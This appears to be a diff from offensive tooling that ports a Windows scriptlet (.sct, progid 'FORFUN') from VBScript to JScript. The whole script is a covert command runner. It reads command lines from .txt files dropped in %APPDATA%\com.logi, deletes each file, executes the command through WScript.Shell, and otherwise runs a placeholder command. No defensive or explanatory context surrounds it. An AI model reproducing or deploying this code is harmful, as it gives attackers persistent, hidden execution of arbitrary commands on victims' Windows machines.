@@ -5,35 +5,32 @@
         progid="FORFUN"
         version="1.0">
     </registration>
-    <script language="VBScript">
+    <script language="JScript">
         <![CDATA[
-            Dim fso
-            Dim LogiPath
-            Dim RunCmd As Boolean
-
-            Set fso = CreateObject("Scripting.FileSystemObject")
-            Set WshShell = WScript.CreateObject("WScript.Shell")
-            LogiPath = WshShell.ExpandEnvironmentStrings("%APPDATA%\com.logi")
-            If (fso.FolderExists(LogiPath)) Then
-                Set folder = fso.GetFolder(LogiPath)
-                Set files = folder.Files
-                RunCmd = 0
-                For each item In files
-                    fullName = LogiPath & "\" & item.Name
-                    If InStr(item.Name, ".txt") <> 0 Then
-                        RunCmd = -1
-                        Set reader = fso.OpenTextFile(fullName, 1, True, 0)
-                        command = reader.ReadLine
-                        reader.Close
+            var WShell = new ActiveXObject("WScript.Shell");
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var logiPath = WShell.ExpandEnvironmentStrings("%APPDATA%\\com.logi")
+            if (fso.FolderExists(logiPath)) {
+                var folder = fso.GetFolder(logiPath)
+                var files = new Enumerator(folder.Files)
+                var runCmd = false
+                for (; !files.atEnd(); files.moveNext()) {
+                    var item = files.item();
+                    var fullName = logiPath + "\\" + item.Name
+                    if (fullName.search(".txt") != -1) {
+                        runCmd = true
+                        var reader = fso.OpenTextFile(fullName, 1, true, 0)
+                        var command = reader.ReadLine()
+                        reader.Close()
                         fso.DeleteFile(fullName)
-                        WshShell.Run(command)
-                    End If
-                Next
+                        WShell.Run(command)
+                    }
+                }
 
-                If RunCmd = False Then
-                    WshShell.Run(%s)
-                End If
-            End If
+                if (!runCmd) {
+                    WShell.Run("%s")
+                }
+            }
         ]]>
     </script>
 </scriptlet>
